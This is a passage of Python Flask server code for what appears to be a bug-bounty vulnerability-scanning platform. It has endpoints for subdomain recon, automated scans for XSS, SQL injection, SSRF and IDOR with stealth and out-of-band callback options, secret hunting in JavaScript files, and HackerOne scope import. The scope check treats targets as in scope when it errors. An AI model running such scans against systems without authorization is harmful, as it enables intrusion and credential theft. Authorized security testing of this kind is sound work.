        history = get_history(limit=200)
        # Add unique URLs to DB
        domains_added = set()
        for entry in history:
            d = entry.get("host","")
            if d and d not in domains_added:
                db.add_active(d, entry.get("url",""))
                domains_added.add(d)
            if entry.get("url"):
                d2 = entry["host"]
                db.add_endpoint(d2, entry["url"])
        return jsonify({"ok":True,
                        "domains": list(domains_added),
                        "message": "URLs imported from proxy history. Run scan for these domains."})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# CI/CD INTEGRATIONS — GitLab, Jenkins, Azure DevOps
# ══════════════════════════════════════════════════════════════════════════════


@app.route("/proxy/start", methods=["POST"])
def proxy_start():
    payload = request.get_json(silent=True, force=True) or {}
    port    = int(payload.get("port", os.environ.get("TMR_PROXY_PORT","8082")))
    try:
        from engine.proxy import start_proxy
        result = start_proxy(port)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/proxy/status")
def proxy_status_route():
    try:
        from engine.proxy import get_proxy_status
        return jsonify(get_proxy_status())
    except Exception as e:
        return jsonify({"running":False,"error":str(e)})


@app.route("/proxy/stop", methods=["POST"])
def proxy_stop():
    try:
        from engine.proxy import stop_proxy
        stop_proxy()
        return jsonify({"ok":True,"running":False})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/queue/add", methods=["POST"])
def queue_add():
    payload = request.get_json(silent=True, force=True) or {}
    d     = _domain(payload.get("domain",""))
    bugs  = payload.get("bugs",[])
    if not d:
        return jsonify({"error":"domain required"}),400
    with _queue_lock:
        # Prevent duplicates
        if any(q["domain"]==d and q["status"]=="pending" for q in _scan_queue):
            return jsonify({"error":f"{d} already queued"}),409
        entry = {"domain":d,"bugs":bugs,"status":"pending",
                 "added_at":__import__("time").strftime("%H:%M:%S")}
        _scan_queue.append(entry)
    return jsonify({"ok":True,"queued":d,"position":len(_scan_queue)})


@app.route("/queue/clear", methods=["POST"])
def queue_clear():
    with _queue_lock:
        removed = len([q for q in _scan_queue if q["status"]=="pending"])
        _scan_queue[:] = [q for q in _scan_queue if q["status"]!="pending"]
    return jsonify({"ok":True,"removed":removed})


@app.route("/queue/list")
def queue_list():
    with _queue_lock:
        return jsonify({"queue":list(_scan_queue),"length":len(_scan_queue)})


@app.route("/queue/remove", methods=["POST"])
def queue_remove():
    payload = request.get_json(silent=True, force=True) or {}
    d = _domain(payload.get("domain",""))
    with _queue_lock:
        before = len(_scan_queue)
        _scan_queue[:] = [q for q in _scan_queue if not (q["domain"]==d and q["status"]=="pending")]
        removed = before - len(_scan_queue)
    return jsonify({"ok":True,"removed":removed})



# ── System Resource Monitor ───────────────────────────────────────────────────
import threading as _threading

_resource_history = []   # last 60 samples
_resource_lock    = _threading.Lock()

def _collect_resources():
    """Background thread: collect CPU/RAM/disk/net every 5s."""
    try:
        import psutil, time as _t
        net_prev = psutil.net_io_counters()
        while True:
            _t.sleep(5)
            try:
                cpu   = psutil.cpu_percent(interval=None)
                mem   = psutil.virtual_memory()
                disk  = psutil.disk_usage('/')
                net   = psutil.net_io_counters()
                sample = {
                    "ts":       _t.strftime("%H:%M:%S"),
                    "cpu":      round(cpu, 1),
                    "mem_pct":  round(mem.percent, 1),
                    "mem_used": round(mem.used / 1e9, 2),
                    "mem_total":round(mem.total / 1e9, 2),
                    "disk_pct": round(disk.percent, 1),
                    "disk_used":round(disk.used / 1e9, 1),
                    "disk_total":round(disk.total / 1e9, 1),
                    "net_sent": round((net.bytes_sent - net_prev.bytes_sent) / 1e3, 1),
                    "net_recv": round((net.bytes_recv - net_prev.bytes_recv) / 1e3, 1),
                    "warnings": [],
                }
                if cpu > 90:      sample["warnings"].append({"level":"critical","msg":f"CPU {cpu}%"})
                elif cpu > 75:    sample["warnings"].append({"level":"warning","msg":f"CPU {cpu}%"})
                if mem.percent > 90: sample["warnings"].append({"level":"critical","msg":f"RAM {mem.percent}%"})
                elif mem.percent > 80: sample["warnings"].append({"level":"warning","msg":f"RAM {mem.percent}%"})
                if disk.percent > 95: sample["warnings"].append({"level":"critical","msg":f"Disk {disk.percent}%"})
                elif disk.percent > 85: sample["warnings"].append({"level":"warning","msg":f"Disk {disk.percent}%"})
                net_prev = net
                with _resource_lock:
                    _resource_history.append(sample)
                    if len(_resource_history) > 60:
                        _resource_history.pop(0)
            except Exception: pass
    except ImportError:
        pass

# Start background collector
_res_thread = _threading.Thread(target=_collect_resources, daemon=True)
_res_thread.start()


@app.route("/recon")
def recon_stream():
    # Auth check — accepts Bearer token, ?token= param, or tmr_token cookie
    from engine.rbac import verify_token as _vt_recon
    _tok_recon = (
        request.headers.get("Authorization","").replace("Bearer","").strip()
        or request.headers.get("X-Auth-Token","").strip()
        or request.args.get("token","")
        or request.cookies.get("tmr_token","")
        or request.cookies.get("session_token","")
    )
    if not _vt_recon(_tok_recon):
        def _auth_err():
            yield _sse({"type":"error","msg":"Unauthorized — please log in first"})
        return Response(_auth_err(), mimetype="text/event-stream", status=401)
    raw_domain = request.args.get("domain","").strip()
    domain = _domain(raw_domain)
    if not domain:
        _bad = raw_domain and re.search(r'[;|&<>"\'\s]', raw_domain)
        _msg = (
            f'"{raw_domain}" contains invalid characters (e.g. semicolon). Enter a clean domain like "vercel.com".'
            if _bad else
            f'"{raw_domain}" is not a valid domain. Use the full domain, e.g. "vercel.com".'
            if raw_domain else
            "No domain provided."
        )
        return Response(_sse({"type":"error","msg":_msg}), mimetype="text/event-stream")

    # Validate domain has a TLD - most recon tools won't work without it
    _parts = domain.split('.')
    if len(_parts) < 2 or len(_parts[-1]) < 2:
        def _warn_gen():
            import json as _j
            yield f"data: {_j.dumps({'type':'error','msg':f'Domain "{domain}" has no TLD. Use full domain like "{domain}.com". Most tools require a proper domain.'})}" + "\n\n"
            yield f"data: {_j.dumps({'type':'ai_tip','msg':f'Tip: Enter the full domain with TLD, e.g. "{domain}.com" or "{domain}.io" or "{domain}.it"'})}" + "\n\n"
            yield f"data: {_j.dumps({'type':'done'})}" + "\n\n"
        return Response(_warn_gen(), mimetype="text/event-stream")

    opts = {
        "skip_subs":      request.args.get("skip_subs")      == "1",
        "skip_crawl":     request.args.get("skip_crawl")     == "1",
        "skip_port":      request.args.get("skip_port")      == "1",
        "skip_endpoints": request.args.get("skip_endpoints") == "1",
        "skip_js":        request.args.get("skip_js")        == "1",
        "port_mode":      request.args.get("port_mode",      "top100"),
        "custom_ports":   request.args.get("custom_ports",   ""),
        "max_subs":       int(request.args.get("max_subs",   "50000")),
        "max_live":       int(request.args.get("max_live",   "2000")),
        "subs_timeout":   int(request.args.get("subs_timeout","600")),
        "oob_host":       os.environ.get("OOB_HOST", request.args.get("oob_host","")),
        "bxss_host":      os.environ.get("BXSS_HOST", request.args.get("bxss_host","")),
        "stealth":        request.args.get("stealth","normal"),
        "brute_wordlist": request.args.get("brute_wordlist",""),
        # NOTE: explicit_all_ports has been removed. recon.py guard is unconditional —
        # port_mode=all is ALWAYS downgraded to top100 regardless of any client param.
    }

    sess = _sess(domain)

    # ── Duplicate scan prevention ──────────────────────────────────────────
    # If recon thread is alive, reconnect to it instead of restarting
    existing_t = sess.get("recon_t")
    if existing_t and existing_t.is_alive() and sess.get("recon_q"):
        log.info(f"[recon] {domain}: reconnecting to running scan")
        existing_q = sess["recon_q"]
        def _reconnect_gen():
            import json as _j
            yield f"data: {_j.dumps({'type':'log','msg':'Reconnected to running recon'})}\n\n"
            while existing_t.is_alive():
                import time; time.sleep(2)
            yield f"data: {_j.dumps({'type':'recon_done'})}\n\n"
        return Response(stream_with_context(_reconnect_gen()), mimetype="text/event-stream",
                       headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

    # Kill any previous recon for this domain
    if sess.get("recon_q"):
        try: sess["recon_q"].put(None)
        except Exception: pass

    q = queue.Queue(maxsize=2000)
    sess["recon_q"] = q

    def _run():
        try:
            sess["recon_running"] = True
            sess["recon_started_at"] = time.time()
            run_recon(domain, opts, q, db)
        except Exception as _re:
            log.error(f"[recon] {domain}: {_re}")
            q.put({"type":"error","msg":str(_re)})
        finally:
            sess["recon_running"] = False
            q.put({"type":"recon_done_sentinel"})
            q.put(None)  # signal SSE to close
            # Rich recon done notification
            try:
                hosts = db.get_hosts(domain)
                get_rich_notifier().recon_done(
                    domain,
                    hosts.get("subs_count",0),
                    hosts.get("active_count",0),
                    db.count_endpoints(domain),
                    db.get_tech(domain),
                )
            except Exception: pass

    t = threading.Thread(target=_run, daemon=True, name=f"recon-{domain}")
    sess["recon_t"] = t
    t.start()

    def stream():
        while True:
            try: item = q.get(timeout=25)
            except queue.Empty: yield ": keepalive\n\n"; continue
            if item is None: break
            yield _sse(item)
            if item.get("type") in ("recon_done","recon_done_sentinel","error"): break

    return Response(stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

# ── Scan SSE ──────────────────────────────────────────────────────────────────


@app.route("/report/finding", methods=["POST"])
def report_finding():
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    finding  = payload.get("finding",{})
    platform = payload.get("platform","h1")  # h1, intigriti, bugcrowd
    chains   = db.get_chains(d)
    try:
        if platform == "intigriti":
            from engine.reporter import generate_intigriti_report
            report = generate_intigriti_report(finding, d, chains)
        elif platform == "bugcrowd":
            from engine.reporter import generate_bugcrowd_report
            report = generate_bugcrowd_report(finding, d, chains)
        else:
            report = generate_h1_report(finding, d, chains)
        return jsonify({"report": report})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/report/full", methods=["POST"])
def report_full():
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    findings = db.get_findings(d)
    chains   = db.get_chains(d)
    meta     = db.get_meta(d)
    waf_info = meta.get("waf")
    recon_data = {
        "subs":      db.get_hosts(d).get("subs_count",0),
        "live":      db.get_hosts(d).get("active_count",0),
        "endpoints": db.count_endpoints(d),
        "tech":      db.get_tech(d),
    }
    try:
        report = generate_full_report(d, findings, chains, recon_data, waf_info)
        db.save_report(d, report)
        return jsonify({"report": report})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/report/get")
def report_get():
    d = _domain(request.args.get("domain",""))
    return jsonify({"report": db.get_report(d)})


@app.route("/report/save", methods=["POST"])
def report_save():
    """Save AI report markdown to DB for later PDF generation."""
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    md_text = payload.get("markdown","")
    risk    = payload.get("risk","HIGH")
    stats   = payload.get("stats",{})
    if d and md_text:
        db.save_meta(d, {
            "last_report": md_text,
            "last_report_risk": risk,
            "last_report_stats": stats,
            "last_report_ts": __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ"),
        })
        return jsonify({"ok": True})
    return jsonify({"ok": False, "error": "missing domain or markdown"}), 400



# ── Scope Management ──────────────────────────────────────────────────────────


@app.route("/report_lock", methods=["GET","POST","DELETE"])
def report_lock():
    d = _domain(request.args.get("domain","") or (request.get_json(silent=True, force=True) or {}).get("domain",""))
    with _report_lock_mu:
        if request.method == "GET":
            return jsonify({"locked": _report_locks.get(d, False)})
        elif request.method == "POST":
            _report_locks[d] = True
            return jsonify({"ok": True, "locked": True})
        else:
            _report_locks.pop(d, None)
            return jsonify({"ok": True, "locked": False})




# ── PDF Report Generation ─────────────────────────────────────────────────────


@app.route("/results")
def results():
    d = _domain(request.args.get("domain",""))
    # Confidence threshold: default 60 — suppress heuristic noise
    # Pass ?min_confidence=0 to see all findings
    min_conf = int(request.args.get("min_confidence", 60))
    severity = request.args.get("severity", "")
    bug_type = request.args.get("bug_type", "")
    finds = db.get_findings(d,
                            min_confidence=min_conf,
                            severity=severity or None,
                            bug_type=bug_type or None)
    return jsonify({
        "findings":       finds,
        "chains":         db.get_chains(d),
        "total_unfiltered": len(db.get_findings(d)),
        "min_confidence": min_conf,
    })


@app.route("/retest", methods=["POST"])
def retest_finding():
    """Retest a specific finding to verify it's still valid."""
    payload = request.get_json(silent=True, force=True) or {}
    finding = payload.get("finding", {})
    if not finding:
        return jsonify({"error": "finding required"}), 400

    try:
        from engine.retest import RetestEngine
        engine = RetestEngine()
        result = engine.retest(finding)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e), "still_valid": None}), 500



# ── Scan Queue ────────────────────────────────────────────────────────────────
_scan_queue: list = []  # [{domain, bugs, status, added_at}]
_queue_lock = threading.Lock()

# ── Scan Queue Worker ─────────────────────────────────────────────────────────
def _queue_worker():
    """Background worker — one thread per allowed concurrent slot.
    Multiple instances run in parallel up to MAX_CONCURRENT_SCANS."""
    import time as _time
    log.info("[queue] worker started")
    while True:
        try:
            _time.sleep(2)
            entry = None
            with _queue_lock:
                for item in _scan_queue:
                    if item["status"] == "pending":
                        item["status"] = "running"
                        entry = item
                        break
            if entry is None:
                continue

            domain = entry["domain"]
            bugs   = entry.get("bugs", []) or ["xss","sqli","ssrf","cors","idor","misconfig"]
            log.info(f"[queue] processing: {domain} with {len(bugs)} bug types")

            try:
                # Per-domain queue for SSE events (discarded since no SSE client here)
                import queue as _q
                local_q = _q.Queue(maxsize=2000)
                from scanner import run_scan

                # ── Streaming pipeline: recon and scan run in parallel ─────────
                # recon writes endpoints to DB continuously; run_scan reads DB
                # at start and then re-reads before each bug via _refresh_endpoints_for_bug().
                _recon_done_ev = threading.Event()
                _recon_exc     = [None]  # capture any recon exception

                def _do_recon_bg():
                    try:
                        from recon import run_recon as _rr
                        recon_opts = entry.get("recon_opts", {
                            "skip_subs": False, "skip_port": False,
                            "port_mode": "top100", "skip_js": False,
                        })
                        _rr(domain, recon_opts, local_q, db)
                        log.info(f"[stream] recon finished for {domain}: "
                                 f"{db.count_endpoints(domain)} endpoints in DB")
                    except Exception as _re:
                        _recon_exc[0] = _re
                        log.debug(f"[stream] recon bg error for {domain}: {_re}")
                    finally:
                        _recon_done_ev.set()

                _recon_t = threading.Thread(target=_do_recon_bg, daemon=True,
                                            name=f"recon-stream-{domain}")
                _recon_t.start()

                # Give recon a head start to populate first endpoints before scanner
                # reads the DB snapshot. 30s is enough for passive sources + httpx probe.
                _head_start = 30
                _recon_done_ev.wait(timeout=_head_start)
                _ep_count = db.count_endpoints(domain)
                if _recon_done_ev.is_set():
                    log.info(f"[stream] recon done within head-start window: "
                             f"{_ep_count} endpoints — scanner starting")
                else:
                    log.info(f"[stream] head-start elapsed ({_head_start}s): "
                             f"{_ep_count} endpoints in DB — scanner starting before recon finishes")
                    local_q.put({"type": "log",
                                 "msg": f"[stream] scanner started with {_ep_count} endpoints — "
                                        f"recon still running, more will be absorbed per-bug",
                                 "status": "ok"})

                run_scan(domain, bugs, local_q, db, scan_speed="normal")

                # Wait for recon to finish if it outlasted the scan
                if not _recon_done_ev.is_set():
                    log.info(f"[stream] scan done, waiting for recon thread to finish for {domain}")
                    _recon_t.join(timeout=600)

                entry["status"] = "done"
                log.info(f"[queue] done: {domain}")
            except Exception as e:
                entry["status"] = "error"
                entry["error"]  = str(e)
                log.error(f"[queue] {domain}: {e}")

        except Exception as e:
            log.error(f"[queue_worker] unexpected: {e}")
            _time.sleep(5)

_queue_worker_thread = threading.Thread(target=_queue_worker, daemon=True,
                                         name="scan-queue-worker-0")
_queue_worker_thread.start()

# Spin up additional worker threads so concurrent scans actually run in parallel.
# MAX_CONCURRENT_SCANS controls how many run at once (default 3, set via env).
for _wid in range(1, MAX_CONCURRENT_SCANS):
    _t = threading.Thread(target=_queue_worker, daemon=True,
                          name=f"scan-queue-worker-{_wid}")
    _t.start()
    log.info(f"[queue] worker-{_wid} started (MAX_CONCURRENT_SCANS={MAX_CONCURRENT_SCANS})")



@app.route("/scan")
def scan_stream():
    from engine.rbac import verify_token as _vt_scan
    _tok_scan = (request.headers.get("Authorization","").replace("Bearer","").strip()
                 or request.args.get("token","")
                 or request.cookies.get("tmr_token",""))
    if not _vt_scan(_tok_scan):
        return Response(_sse({"type":"error","msg":"Unauthorized"}),
                        mimetype="text/event-stream", status=401)
    domain = _domain(request.args.get("domain",""))
    bugs   = request.args.getlist("bugs")
    if not domain or not bugs:
        return Response(_sse({"error":"missing params"}), mimetype="text/event-stream")

    # Extract ALL request values HERE before spawning thread
    # request.args is NOT available inside background threads
    stealth    = request.args.get("stealth",    "normal")
    auto_sel   = request.args.get("auto_select","1") == "1"
    scan_speed = request.args.get("scan_speed", "normal")
    # URL scan mode: specific URL passed — inject it as endpoint so scanner tests it
    target_url = request.args.get("url","").strip()
    if target_url and target_url.startswith("http"):
        db.add_endpoint(domain, target_url)
        # Also add domain as active host if not present
        hosts = db.get_hosts(domain)
        base  = target_url.split("?")[0].rsplit("/",1)[0] if "/" in target_url[8:] else target_url
        if not hosts.get("active"):
            db.add_active(domain, base)

    q = queue.Queue()
    sess = _sess(domain)
    if sess["scan_q"]: sess["scan_q"].put(None)
    sess["scan_q"] = q

    # Save scan state for resume
    _scan_state_key = f"scan_state_{domain}"
    db.save_meta(domain, {
        _scan_state_key: {
            "bugs": bugs, "stealth": stealth,
            "auto_sel": auto_sel, "speed": scan_speed,
            "started": __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ"),
            "status": "running"
        }
    })

    def _run():
        try:
            auth_engine = sess["auth"]
            auth_s = auth_engine.get_session() if auth_engine.is_authenticated() else None

            # ── Detect parallel recon and emit streaming log ──────────────────
            _recon_running = sess.get("recon_running", False)
            _ep_at_start   = db.count_endpoints(domain) if db else 0
            if _recon_running:
                log.info(f"[stream] /scan called while recon still running for {domain}: "
                         f"{_ep_at_start} endpoints in DB — streaming pipeline active")
                q.put({"type": "log",
                       "msg": f"[stream] scanning started before recon finished — "
                              f"{_ep_at_start} endpoints loaded now, more absorbed per-bug",
                       "status": "ok"})
            else:
                log.info(f"[stream] /scan starting (recon complete): {_ep_at_start} endpoints")

            run_scan(domain, bugs, q, db,
                     auth_session=auth_s,
                     stealth_mode=stealth,
                     auto_select=auto_sel,
                     scan_speed=scan_speed)
            # Post-scan: chains
            findings = db.get_findings(domain)
            from engine.chain import find_chains
            chains = find_chains(findings)
            sess["chains"] = chains
            db.save_chains(domain, chains)
            if chains:
                q.put({"type":"chains_found","count":len(chains),
                       "chains":[{"id":c["id"],"name":c["name"],
                                  "severity":c["severity"]} for c in chains]})
            # ── Monitor: record scan + create alerts for critical/high findings
            try:
                from engine.monitor import record_scan_start, record_scan_done, create_alert
                crits = [f for f in findings if f.get("severity") in ("critical","high")]
                # Record scan in history (start=now, done immediately after)
                _scan_id = record_scan_start(domain, scan_type="manual")
                _scan_id = _scan_id.lastrowid if hasattr(_scan_id,'lastrowid') else 0
                _score   = max(0, 100 - len(crits)*10 - (len(findings)-len(crits))*2)
                record_scan_done(_scan_id, len(findings), len(crits), _score)
                # Alert on each critical/high finding
                for _f in crits[:20]:
                    create_alert(
                        domain      = domain,
                        alert_type  = _f.get("bug","vuln"),
                        severity    = _f.get("severity","high"),
                        title       = _f.get("title", _f.get("description","Finding"))[:120],
                        url         = _f.get("url",""),
                        details     = {"param": _f.get("param",""), "poc": _f.get("poc","")},
                    )
                log.info(f"[monitor] scan recorded, {len(crits)} alerts created for {domain}")
            except Exception as _me:
                log.debug(f"[monitor] record/alert: {_me}")
                rn = get_rich_notifier()
                for c in chains:
                    try: rn.chain(c, domain)
                    except: pass
            # ── AI Triage: rank findings by real exploitability ──────────────
            if findings:
                try:
                    from engine.ai_analyst import triage_findings as _triage_fn
                    _tech_list = db.get_tech(domain) or []
                    _triage_text = _triage_fn(findings, domain, tech=_tech_list)
                    if _triage_text:
                        q.put({"type": "ai_triage", "text": _triage_text, "domain": domain})
                        db.save_meta(domain, {"ai_triage": _triage_text})
                except Exception as _tre:
                    log.debug(f"[scan] ai_triage: {_tre}")

            # ── AI Executive Summary ──────────────────────────────────────────
            ai_sum = {}
            try:
                recon = {
                    "subs":      db.get_hosts(domain).get("subs_count",0),
                    "live":      db.get_hosts(domain).get("active_count",0),
                    "endpoints": db.count_endpoints(domain),
                    "tech":      db.get_tech(domain),
                }
                ai_sum = generate_executive_summary(
                    domain, findings, chains, recon,
                    db.get_meta(domain).get("waf"))
                db.save_meta(domain, {"ai_summary": ai_sum})
                q.put({"type":"ai_summary","summary": ai_sum})
            except Exception as e:
                log.debug(f"AI summary: {e}")
            try:
                crits = sum(1 for f in findings if f.get("severity")=="critical")
                highs = sum(1 for f in findings if f.get("severity")=="high")
                get_rich_notifier().scan_done(
                    domain, len(findings), crits, highs, len(chains),
                    ai_sum.get("ceo_paragraph","") if ai_sum else "")
            except: pass
        except Exception as e:
            log.error(f"scan _run crashed: {e}")
            import traceback; log.error(traceback.format_exc())
            q.put({"type":"error","msg":str(e)})
        finally:
            q.put({"type":"scan_all_done"})

    t = threading.Thread(target=_run, daemon=True, name=f"scan-{domain}")
    sess["scan_t"] = t
    t.start()

    def stream():
        while True:
            try: item = q.get(timeout=25)
            except queue.Empty: yield ": keepalive\n\n"; continue
            if item is None: break
            yield _sse(item)
            if item.get("type") in ("scan_all_done","error"): break

    return Response(stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

# ── Stop ──────────────────────────────────────────────────────────────────────


@app.route("/scan/resume", methods=["POST"])
def scan_resume():
    """Resume a previously started scan from its saved state."""
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    if not d:
        return jsonify({"error":"domain required"}),400
    meta  = db.get_meta(d)
    state = meta.get(f"scan_state_{d}",{})
    if not state:
        return jsonify({"error":"no saved scan state for this domain"}),404
    if state.get("status") == "done":
        return jsonify({"error":"scan already completed","state":state}),409
    # Redirect to normal scan with saved params
    return jsonify({
        "ok": True,
        "message": f"Resume scan: GET /scan?domain={d}&" + "&".join(f"bugs={b}" for b in state.get("bugs",[])),
        "state": state,
        "resume_url": f"/scan?domain={d}&" + "&".join(f"bugs={b}" for b in state.get("bugs",[]))
                      + f"&stealth={state.get('stealth','normal')}&scan_speed={state.get('speed','normal')}"
    })



# ── JIRA Integration ──────────────────────────────────────────────────────────


@app.route("/scan/state")
def scan_state():
    """Get saved scan state for a domain (for resume after crash)."""
    d = _domain(request.args.get("domain",""))
    meta = db.get_meta(d)
    key  = f"scan_state_{d}"
    state = meta.get(key, {})
    # Also check if scan is currently running
    sess   = _sess(d)
    running = bool(sess.get("scan_q"))
    return jsonify({"state": state, "running": running, "domain": d})


@app.route("/scan_state/<path:domain>")
def scan_state_by_domain(domain):
    d     = _domain(domain)
    sess  = _sess(d)
    hosts = db.get_hosts(d)
    finds = db.get_findings(d)
    return jsonify({
        "domain":       d,
        "recon_running": sess["recon_t"] is not None and sess["recon_t"].is_alive(),
        "scan_running":  sess["scan_t"]  is not None and sess["scan_t"].is_alive(),
        "subs":     hosts.get("subs_count", 0),
        "live":     hosts.get("active_count", 0),
        "endpoints": db.count_endpoints(d),
        "findings":  len(finds),
        "critical": sum(1 for f in finds if f.get("severity") == "critical"),
        "high":     sum(1 for f in finds if f.get("severity") == "high"),
    })

# ── APEX graph data ───────────────────────────────────────────────────────────


@app.route("/scope/<path:domain>", methods=["GET","POST","DELETE"])
def scope(domain):
    d = _domain(domain)
    if request.method == "GET":
        meta = db.get_meta(d) or {}
        return jsonify(meta.get("scope", {"includes":[],"excludes":[]}))
    elif request.method == "POST":
        payload  = request.get_json(silent=True, force=True) or {}
        includes = payload.get("includes", [])
        excludes = payload.get("excludes", [])
        db.save_meta(d, {"scope": {"includes": includes, "excludes": excludes}})
        return jsonify({"ok": True, "includes": includes, "excludes": excludes})
    else:
        db.save_meta(d, {"scope": {"includes": [], "excludes": []}})
        return jsonify({"ok": True, "cleared": True})


@app.route("/scope/import_h1", methods=["POST"])
def scope_import_h1():
    """
    POST /scope/import_h1
    Import scope from HackerOne program API.
    Body: {domain: "example.com", h1_handle: "examplecorp", api_token: "..."}
    
    Fetches structured_scopes from H1 API and saves as include/exclude rules.
    """
    payload    = request.get_json(silent=True, force=True) or {}
    d          = _domain(payload.get("domain",""))
    h1_handle  = payload.get("h1_handle","").strip()
    api_token  = payload.get("api_token","") or os.environ.get("HACKERONE_API_TOKEN","")
    api_user   = payload.get("api_user","") or os.environ.get("HACKERONE_USERNAME","")

    if not d:
        return jsonify({"error": "domain required"}), 400

    includes = []; excludes = []; raw = []

    # Try H1 API if token provided
    if h1_handle and api_token:
        try:
            import urllib.request as _ureq, json as _j, base64 as _b64
            _creds  = _b64.b64encode(f"{api_user}:{api_token}".encode()).decode()
            _url    = f"https://api.hackerone.com/v1/hackers/programs/{h1_handle}/structured_scopes?page[size]=100"
            _req    = _ureq.Request(_url, headers={
                "Authorization": f"Basic {_creds}",
                "Accept":        "application/json",
            })
            _resp   = _ureq.urlopen(_req, timeout=15)
            _data   = _j.loads(_resp.read())
            for scope_entry in _data.get("data", []):
                attrs    = scope_entry.get("attributes", {})
                asset    = attrs.get("asset_identifier","").strip()
                atype    = attrs.get("asset_type","")
                eligible = attrs.get("eligible_for_bounty", True)
                eligible_sub = attrs.get("eligible_for_submission", True)
                in_scope = scope_entry.get("type","") == "structured-scope-in-scope"

                if not asset: continue
                raw.append({"asset": asset, "type": atype, "in_scope": in_scope,
                             "bounty": eligible, "submission": eligible_sub})

                if in_scope and eligible_sub:
                    # Convert H1 asset to scope rule
                    if atype in ("WILDCARD", "URL"):
                        includes.append(asset.replace("https://","").replace("http://","").rstrip("/"))
                    elif atype == "DOMAIN":
                        includes.append(asset)
                        includes.append("*." + asset)
                elif not in_scope:
                    excludes.append(asset.replace("https://","").replace("http://","").rstrip("/"))

        except Exception as h1e:
            return jsonify({"error": f"H1 API error: {h1e}", "hint":
                "Ensure HACKERONE_USERNAME and HACKERONE_API_TOKEN are set"}), 502

    else:
        # Auto-generate scope from domain
        try:
            from engine.scope_manager import ScopeManager
            sm = ScopeManager.from_program("wildcard", d)
            includes = sm.includes
            excludes = sm.excludes
        except Exception:
            includes = [f"*.{d}", d]
            excludes = []

    # Save scope
    db.save_meta(d, {"scope": {"includes": includes, "excludes": excludes}})

    return jsonify({
        "ok":       True,
        "domain":   d,
        "includes": includes,
        "excludes": excludes,
        "raw":      raw[:50],
        "source":   "hackerone_api" if (h1_handle and api_token and raw) else "auto_generated",
    })


@app.route("/scope/templates")
def scope_templates():
    """GET /scope/templates — pre-built scope templates."""
    return jsonify({
        "wildcard":   {"description": "All subdomains of target", "example": "*.example.com"},
        "main_only":  {"description": "Main domain and www only"},
        "api_only":   {"description": "API subdomain only"},
        "full":       {"description": "Everything under target domain"},
    })


@app.route("/scope/check", methods=["POST"])
def scope_check():
    """Check if a URL/host is in scope for a domain."""
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    url     = payload.get("url","")
    meta    = db.get_meta(d) or {}
    scope_d = meta.get("scope", {})
    try:
        from engine.scope_manager import ScopeManager
        sm = ScopeManager.from_dict(scope_d)
        return jsonify({"url": url, "in_scope": sm.is_in_scope(url)})
    except Exception as e:
        return jsonify({"url": url, "in_scope": True, "error": str(e)})



# ══════════════════════════════════════════════════════════════════════════════
# RBAC — Multi-user Authentication
# ══════════════════════════════════════════════════════════════════════════════


@app.route("/secret_hunter/scan", methods=["POST"])
def secret_hunter_scan():
    """Run UnifiedSecretHunter in safe mode (binary required at app root)."""
    from engine.jxscout import run_secret_hunter, run_secret_hunter_on_domain
    p      = request.get_json(silent=True) or {}
    domain = _domain(p.get("domain",""))
    urls   = p.get("urls", [])
    crawl  = p.get("crawl", False)

    # If no URLs given, use collected JS endpoints from DB
    if not urls and domain:
        urls = [e for e in db.get_endpoints(domain, limit=500)
                if re.search(r"\.js(\?|$|#)", e, re.I)]

    findings = run_secret_hunter(
        targets    = urls,
        domain     = domain,
        crawl      = crawl,
        no_validate= not p.get("validate", False),
    )

    # Save critical findings to DB
    saved = 0
    for f in findings:
        if f.get("severity") in ("critical","high"):
            db.add_finding(domain, {
                "bug":        "jsleak",
                "severity":   f.get("severity","high"),
                "title":      f"Secret found: {f.get('type','Unknown')}",
                "url":        f.get("source",""),
                "value":      (f.get("value") or "")[:80],
                "poc":        f"# {f.get('type','')}\n{f.get('context','')[:200]}",
                "confidence": 90,
                "impact":     f"Exposed {f.get('type','')} credential",
                "remediation": "Remove hardcoded secrets, use environment variables.",
            })
            saved += 1

    return jsonify({"findings": findings, "count": len(findings),
                    "saved": saved, "domain": domain,
                    "note": "No license key required"})


@app.route("/secret_hunter/status")
def secret_hunter_status():
    from engine.jxscout import get_status
    return jsonify(get_status())


@app.route("/stats")
def stats():
    """Rich statistics for a domain."""
    d = _domain(request.args.get("domain",""))
    findings = db.get_findings(d)
    hosts    = db.get_hosts(d)
    chains   = db.get_chains(d)

    by_sev  = {}
    by_bug  = {}
    by_conf = {"high":0,"medium":0,"low":0}

    for f in findings:
        sev = f.get("severity","info")
        bug = f.get("bug","unknown")
        conf = f.get("confidence", 50)
        by_sev[sev]  = by_sev.get(sev,0)  + 1
        by_bug[bug]  = by_bug.get(bug,0)  + 1
        if conf >= 80:   by_conf["high"]   += 1
        elif conf >= 60: by_conf["medium"] += 1
        else:            by_conf["low"]    += 1

    return jsonify({
        "domain":      d,
        "total":       len(findings),
        "by_severity": by_sev,
        "by_bug_type": dict(sorted(by_bug.items(), key=lambda x: -x[1])[:20]),
        "by_confidence": by_conf,
        "chains":      len(chains),
        "subdomains":  hosts.get("subs_count",0),
        "live_hosts":  hosts.get("active_count",0),
        "endpoints":   db.count_endpoints(d),
        "tech_stack":  db.get_tech(d)[:20],
        "critical":    by_sev.get("critical",0),
        "high":        by_sev.get("high",0),
    })


# ── Retest single finding ─────────────────────────────────────────────────────


@app.route("/stop", methods=["POST"])
def stop():
    d = _domain((request.get_json(silent=True, force=True) or {}).get("domain","") or request.args.get("domain",""))
